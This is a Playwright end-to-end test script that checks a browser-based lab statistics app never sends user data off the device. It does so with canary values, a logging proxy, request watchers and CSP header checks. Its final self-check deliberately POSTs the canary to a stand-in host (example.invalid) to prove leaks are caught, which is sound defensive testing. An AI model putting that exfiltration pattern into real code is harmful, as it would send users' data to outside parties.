// Network-silence check: a lab's data never leaves the browser.
//
// The data typed here carries a canary (the digits 649182 in its values
// and the label CANARY41 in its titles). While the app is used the way a
// lab uses it (paste an XY table and fit it, a column t test, a grouped
// two-way ANOVA, graph exports, save the project, make a share link,
// reload and let autosave restore it, import an .xlsx file), every
// request is watched twice:
//
// - Playwright's request events (page and engine worker): no request may
//   carry the canary in its URL, headers or body, and none may send data
//   (only GET and HEAD; no POST, no beacon);
// - a local proxy that all of the browser's traffic goes through: it sees
//   every outside connection, whichever part of the browser opens it, and
//   only the site itself and cdn.jsdelivr.net (the Python runtime) may be
//   contacted, plus PyPI during the .xlsx import alone: the xlsx reader
//   (openpyxl) installs from there on first use, never before.
//
// It also fails when the Content-Security-Policy header is missing from
// the page, the engine worker or the service worker, and on any CSP
// violation other than Plotly's harmless eval probe. A self-check at the
// end sends the canary to example.invalid from a page without the CSP and
// fails unless both watchers catch it.
//
// Run against the production build with its headers:
//   npm run build && node scripts/serve-dist.mjs 5300 &
//   node scripts/e2e-privacy.mjs http://127.0.0.1:5300/
import { chromium } from "playwright";
import { createServer, request as httpRequest } from "node:http";
import { connect } from "node:net";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const baseUrl = process.argv[2] ?? "http://127.0.0.1:5300/";
const site = new URL(baseUrl);
const CANARY_DIGITS = "649182";
const CANARY_LABEL = "CANARY41";
const ALLOWED_HOSTS = new Set(["cdn.jsdelivr.net"]);
const XLSX_HOSTS = new Set(["pypi.org", "files.pythonhosted.org"]);
const XLSX = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "engine", "tests",
  "fixtures", "synthetic_srb_plate.xlsx");

const fail = [];
const expect = (label, ok, detail = "") => {
  console.log(`${ok ? "ok  " : "FAIL"} ${label}${detail ? `: ${detail}` : ""}`);
  if (!ok) fail.push(label);
};

// --- the proxy: every outside connection the browser makes -------------
const outside = []; // { host, phase }
let phase = "start";
const proxy = createServer((req, res) => {
  // Plain http:// through the proxy (https arrives as CONNECT below).
  const target = new URL(req.url);
  outside.push({ host: target.hostname, phase, how: req.method });
  const up = httpRequest(target, { method: req.method, headers: req.headers }, (r) => {
    res.writeHead(r.statusCode ?? 502, r.headers);
    r.pipe(res);
  });
  up.on("error", () => res.writeHead(502).end());
  req.pipe(up);
});
proxy.on("connect", (req, sock, head) => {
  const [host, port] = String(req.url).split(":");
  outside.push({ host, phase, how: "CONNECT" });
  const up = connect(Number(port) || 443, host, () => {
    sock.write("HTTP/1.1 200 Connection Established\r\n\r\n");
    up.write(head);
    up.pipe(sock);
    sock.pipe(up);
  });
  up.on("error", () => sock.destroy());
  sock.on("error", () => up.destroy());
});
await new Promise((r) => proxy.listen(0, "127.0.0.1", r));
const proxyPort = proxy.address().port;

const browser = await chromium.launch({
  // Loopback (the site under test) stays direct; everything else goes
  // through the proxy.
  proxy: { server: `http://127.0.0.1:${proxyPort}` },
});

// --- Playwright's view: what each request carries -----------------------
const carried = []; // requests that hold the canary or send data
const watch = (ctx, tag) => {
  ctx.on("request", (req) => {
    const text = [req.url(), JSON.stringify(req.headers()), req.postData() ?? ""].join("\n");
    let decoded = text;
    try { decoded = decodeURIComponent(text); } catch { /* keep raw */ }
    const holds = decoded.includes(CANARY_DIGITS) || decoded.includes(CANARY_LABEL);
    const sends = !["GET", "HEAD"].includes(req.method());
    if (holds || sends) {
      carried.push({ tag, phase, method: req.method(), url: req.url().slice(0, 120), holds, sends });
    }
  });
};

const violations = [];
const watchCsp = (page) => {
  page.addInitScript(() => {
    document.addEventListener("securitypolicyviolation", (e) =>
      console.error(`CSP-VIOLATION ${e.violatedDirective} ${e.blockedURI} ${e.sourceFile}`));
  });
  page.on("console", (m) => {
    const t = m.text();
    if (!t.startsWith("CSP-VIOLATION")) return;
    // Plotly's WebGL code (regl) probes eval; blocking it changes nothing.
    if (/^CSP-VIOLATION script-src eval .*\/plotly-[\w-]+\.js$/.test(t)) return;
    violations.push(t);
  });
};

const ctx = await browser.newContext({ viewport: { width: 1400, height: 1000 }, acceptDownloads: true });
watch(ctx, "app");
const page = await ctx.newPage();
watchCsp(page);
const errors = [];
page.on("pageerror", (e) => errors.push(e.message));
let workerUrl = null;
page.on("worker", (w) => { workerUrl ??= w.url(); });

const download = async (trigger) => {
  const [d] = await Promise.all([page.waitForEvent("download", { timeout: 90000 }), trigger()]);
  return d.suggestedFilename();
};
const resultsMatch = (re, timeout = 90000) => page.waitForFunction((src) =>
  new RegExp(src).test(document.querySelector(".pane-results")?.innerText ?? ""),
re.source, { timeout }).then(() => true, () => false);
const pasteInto = (selector, text) => page.evaluate(([sel, t]) => {
  const el = document.querySelector(sel);
  const dt = new DataTransfer();
  dt.setData("text/plain", t);
  el.focus();
  el.dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
}, [selector, text]);

// --- 1. start screen: paste an XY table, the fit runs --------------------
phase = "boot + XY fit";
await page.goto(baseUrl, { waitUntil: "domcontentloaded" });
await page.locator(".start-screen").waitFor({ timeout: 60000 });
await page.getByRole("textbox", { name: "Paste data and get a table type" }).fill(
  `Conc\t${CANARY_LABEL} rep 1\t${CANARY_LABEL} rep 2\n`
  + "0.001\t98.649182\t101.2\n0.01\t95.1\t97.649182\n0.1\t70.649182\t66.3\n"
  + "1\t30.2\t35.649182\n10\t5.649182\t8.1\n");
await page.getByRole("button", { name: "Create XY table" }).click();
await page.locator(".data-table").waitFor({ timeout: 60000 });
expect("XY table pasted from the start screen is fitted",
  await page.waitForSelector('.pane-results[data-live="true"] .results-table', { timeout: 180000 })
    .then(() => true, () => false));

// --- 2. a column table and a t test --------------------------------------
phase = "column t test";
await page.getByRole("button", { name: "New data table" }).first().click();
const nd = page.locator(".new-table-dialog");
await nd.locator('input[name="table-type"][value="column"]').check();
await nd.getByRole("button", { name: "Create table" }).click();
await page.waitForTimeout(500);
await pasteInto(".data-table tbody input[data-r='0']:not([aria-label$='title'])",
  `${CANARY_LABEL} control\t${CANARY_LABEL} treated\n10.649182\t14.2\n11.3\t15.649182\n9.8\t13.1\n10.4\t14.9\n`);
const imp = page.locator(".import-dialog");
await imp.waitFor({ timeout: 10000 });
await imp.getByRole("button", { name: "Import", exact: true }).click();
await imp.waitFor({ state: "detached", timeout: 10000 }).catch(() => {});
await page.locator(".pane-controls select.analysis-select").selectOption("ttest");
expect("column t test on the canary data returns a P value", await resultsMatch(/P value/));

// --- 3. a grouped table and a two-way ANOVA ------------------------------
phase = "grouped ANOVA";
await page.getByRole("button", { name: "New data table" }).first().click();
const gd = page.locator(".new-table-dialog");
await gd.locator('input[name="table-type"][value="grouped"]').check();
await gd.getByText("Example data").click();
await gd.getByRole("button", { name: "Create table" }).click();
await page.waitForSelector(".result-card h3:has-text('Two-way ANOVA')", { timeout: 60000 });
await page.locator(".data-table tbody input[data-r='0']:not([aria-label$='title'])").first()
  .fill("12.649182");
await page.keyboard.press("Tab");
expect("two-way ANOVA recomputes with a canary value",
  await page.waitForSelector(".result-card h3:has-text('Two-way ANOVA')", { timeout: 60000 })
    .then(() => true, () => false));

// --- 4. graph exports -----------------------------------------------------
phase = "exports";
const panel = page.locator(".plot-card .export-panel").first();
await panel.waitFor({ timeout: 60000 });
for (const fmt of ["svg", "png", "pdf"]) {
  await panel.getByLabel("Export format").selectOption(fmt);
  const name = await download(() => panel.getByRole("button", { name: "Download" }).click())
    .catch((e) => `no download (${e.message.slice(0, 60)})`);
  expect(`graph exported as ${fmt.toUpperCase()} in the browser`, name.endsWith(`.${fmt}`), name);
}

// --- 5. save the project, make a share link ------------------------------
phase = "save + share";
const saved = await download(() => page.getByRole("button", { name: "Save project" }).click())
  .catch(() => "");
expect("project saved as a file", saved.length > 0, saved);
await page.getByRole("button", { name: "More ways to save and share" }).click();
await page.getByRole("menuitem", { name: "Copy share link…" }).click();
const shareDlg = page.getByRole("dialog", { name: "Share this project" });
await shareDlg.waitFor({ timeout: 10000 });
const link = await shareDlg.getByLabel("Share link").inputValue();
expect("share link holds the project in the fragment, which is never sent",
  /#p=[A-Za-z0-9_-]+$/.test(link), `${link.length} characters`);
await page.keyboard.press("Escape");

// --- 6. reload: autosave restores the session ----------------------------
phase = "reload";
await page.waitForTimeout(2000); // autosave debounce
await page.reload({ waitUntil: "domcontentloaded" });
await page.locator(".data-table").waitFor({ timeout: 60000 });
const restored = await page.waitForFunction((d) => [...document.querySelectorAll(".data-table input")]
  .some((i) => i.value.includes(d)), CANARY_DIGITS, { timeout: 60000 }).then(() => true, () => false);
expect("after a reload the session comes back from the browser's own storage", restored);
await page.waitForTimeout(5000); // let anything late show itself

// --- 7. an .xlsx import: the only step that may reach PyPI ----------------
phase = "xlsx import";
await page.getByRole("button", { name: "New data table" }).first().click();
const xd = page.locator(".new-table-dialog");
await xd.locator('input[name="table-type"][value="xy"]').check();
await xd.getByRole("button", { name: "Create table" }).click();
await page.waitForSelector(".grid-toolbar");
await page.getByRole("button", { name: "Import…", exact: true }).click();
await page.locator(".import-dialog").getByLabel("File to import").setInputFiles(XLSX);
expect("an .xlsx file is read (the reader installs on first use)",
  await page.waitForFunction(() =>
    /^9 of 9 rows/.test(document.querySelector(".import-dialog .import-summary")?.textContent ?? ""),
  null, { timeout: 120000 }).then(() => true, () => false));
await page.keyboard.press("Escape");

// --- verdicts --------------------------------------------------------------
const appOutside = outside.filter((o) => o.phase !== "self-check");
const strange = appOutside.filter((o) => o.host !== site.hostname && !ALLOWED_HOSTS.has(o.host)
  && !(o.phase === "xlsx import" && XLSX_HOSTS.has(o.host)));
expect("no connection to any host but the site and cdn.jsdelivr.net (PyPI only for the .xlsx import)",
  strange.length === 0,
  strange.length ? JSON.stringify(strange.slice(0, 5)) : `seen: ${[...new Set(appOutside.map((o) => o.host))].join(", ") || "none"}`);
const appCarried = carried.filter((c) => c.tag === "app");
expect("no request carries the canary data (URL, headers or body)",
  !appCarried.some((c) => c.holds), JSON.stringify(appCarried.filter((c) => c.holds).slice(0, 3)));
expect("no request sends anything (only GET / HEAD)",
  !appCarried.some((c) => c.sends), JSON.stringify(appCarried.filter((c) => c.sends).slice(0, 3)));
expect("no CSP violations (besides Plotly's eval probe)", violations.length === 0, violations.slice(0, 3).join(" | "));
expect("no page errors", errors.length === 0, errors.slice(0, 3).join(" | "));

// The policy must be on everything that runs code.
const swUrl = new URL("sw.js", baseUrl).href;
for (const [what, u] of [["page", baseUrl], ["engine worker", workerUrl], ["service worker", swUrl]]) {
  const csp = u ? (await fetch(u, { method: "HEAD" })).headers.get("content-security-policy") ?? "" : "";
  expect(`${what} is served with the Content-Security-Policy`,
    /connect-src 'self'/.test(csp) && !/connect-src[^;]*\*/.test(csp), u ?? "worker not seen");
}

// --- self-check: the watchers do see a leak --------------------------------
phase = "self-check";
const leakCtx = await browser.newContext({ bypassCSP: true });
watch(leakCtx, "self-check");
const leakPage = await leakCtx.newPage();
await leakPage.goto(new URL("favicon.svg", baseUrl).href);
await leakPage.evaluate((d) => fetch(`https://example.invalid/collect?v=${d}`, { method: "POST", body: d })
  .catch(() => {}), CANARY_DIGITS);
await leakPage.waitForTimeout(1500);
expect("self-check: the proxy sees a connection to another host",
  outside.some((o) => o.phase === "self-check" && o.host === "example.invalid"));
expect("self-check: the request watcher sees the canary leave",
  carried.some((c) => c.tag === "self-check" && c.holds && c.sends));

await browser.close();
proxy.close();
console.log(fail.length ? `\nFAILED: ${fail.length}\n- ${fail.join("\n- ")}` : "\nALL PASSED");
process.exit(fail.length ? 1 : 0);
